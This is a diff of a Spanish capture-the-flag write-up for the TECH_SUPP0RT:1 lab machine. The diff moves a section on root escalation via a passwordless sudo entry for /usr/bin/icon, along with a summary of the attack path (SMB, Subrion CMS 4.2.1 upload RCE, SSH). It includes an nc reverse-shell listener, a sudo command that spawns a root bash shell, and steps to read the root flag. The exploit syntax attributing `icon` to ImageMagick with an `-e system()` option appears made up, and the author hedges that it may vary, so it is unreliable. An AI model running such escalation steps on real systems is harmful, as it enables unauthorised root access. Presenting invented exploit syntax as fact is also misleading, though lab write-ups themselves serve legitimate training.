@@ -1,65 +1,4 @@
----
-layout: default
----
 
-# Máquina TECH_SUPP0RT:1
-
-## 8. Explotación de Sudoers: /usr/bin/icon (ROOT)
-
-El binario `icon` es ejecutable como root sin contraseña. Esto permite aprovecharlo para ejecutar comandos con privilegios elevados.
-
-### 8.1. Confirmación de permisos
-
-**Comando:**
-
-`sudo -l`
-
-### 8.2. Referencia (GTFOBins)
-
-`icon` pertenece a ImageMagick. Si está permitido por `sudoers`, se puede forzar ejecución de comandos.
-
-### 8.3. Escalada a root (shell)
-
-1. **Preparar un listener en Kali (si vas a sacar reverse shell):**
-    
-    `nc -lvnp 4444`
-    
-2. **Ejecutar como root (ejemplo de shell local):**
-    
-    `sudo /usr/bin/icon -help`
-    
-    Si el binario permite ejecutar comandos (depende de la versión/compilación), prueba con una ejecución directa de shell desde la funcionalidad de delegación:
-    
-    - `sudo /usr/bin/icon -e 'system("/bin/bash -p");'`\
-    - o bien una reverse shell adaptando tu IP/puerto.
-
-> Nota: la sintaxis exacta puede variar. Si este paso falla, revisa la ayuda (`icon -h`, `icon -help`) y valida versión (`icon -version`).
-> 
-
-### 8.4. Verificación de privilegios
-
-**Comandos:**
-
-- `id`
-- `whoami`
-
-### 8.5. Flag de root
-
-Una vez como `root`, localiza la flag:
-
-- `cd /root`
-- `ls -la`
-- `cat root.txt`
-
----
-
-## 9. Resumen de la Ruta de Ataque
-
-- Reconocimiento: Nmap + enumeración web.
-- Acceso inicial: SMB (share `websvr`) + credenciales Subrion.
-- RCE: File upload en Subrion CMS 4.2.1.
-- Movimiento/estabilización: SSH como `scamsite`.
-- Escalada: `sudo` sin contraseña sobre `/usr/bin/icon`.
 
 ## 1. Fase de Reconocimiento (Enumeración de Puertos)
 
@@ -234,3 +173,66 @@ Al ejecutar `sudo -l`, identificamos una configuración permisiva en el archivo 
 `(ALL) NOPASSWD: /usr/bin/icon`
 
 ![image.png](image%2015.png)
+
+---
+layout: default
+---
+
+# Máquina TECH_SUPP0RT:1
+
+## 8. Explotación de Sudoers: /usr/bin/icon (ROOT)
+
+El binario `icon` es ejecutable como root sin contraseña. Esto permite aprovecharlo para ejecutar comandos con privilegios elevados.
+
+### 8.1. Confirmación de permisos
+
+**Comando:**
+
+`sudo -l`
+
+### 8.2. Referencia (GTFOBins)
+
+`icon` pertenece a ImageMagick. Si está permitido por `sudoers`, se puede forzar ejecución de comandos.
+
+### 8.3. Escalada a root (shell)
+
+1. **Preparar un listener en Kali (si vas a sacar reverse shell):**
+    
+    `nc -lvnp 4444`
+    
+2. **Ejecutar como root (ejemplo de shell local):**
+    
+    `sudo /usr/bin/icon -help`
+    
+    Si el binario permite ejecutar comandos (depende de la versión/compilación), prueba con una ejecución directa de shell desde la funcionalidad de delegación:
+    
+    - `sudo /usr/bin/icon -e 'system("/bin/bash -p");'`\
+    - o bien una reverse shell adaptando tu IP/puerto.
+
+> Nota: la sintaxis exacta puede variar. Si este paso falla, revisa la ayuda (`icon -h`, `icon -help`) y valida versión (`icon -version`).
+> 
+
+### 8.4. Verificación de privilegios
+
+**Comandos:**
+
+- `id`
+- `whoami`
+
+### 8.5. Flag de root
+
+Una vez como `root`, localiza la flag:
+
+- `cd /root`
+- `ls -la`
+- `cat root.txt`
+
+---
+
+## 9. Resumen de la Ruta de Ataque
+
+- Reconocimiento: Nmap + enumeración web.
+- Acceso inicial: SMB (share `websvr`) + credenciales Subrion.
+- RCE: File upload en Subrion CMS 4.2.1.
+- Movimiento/estabilización: SSH como `scamsite`.
+- Escalada: `sudo` sin contraseña sobre `/usr/bin/icon`.
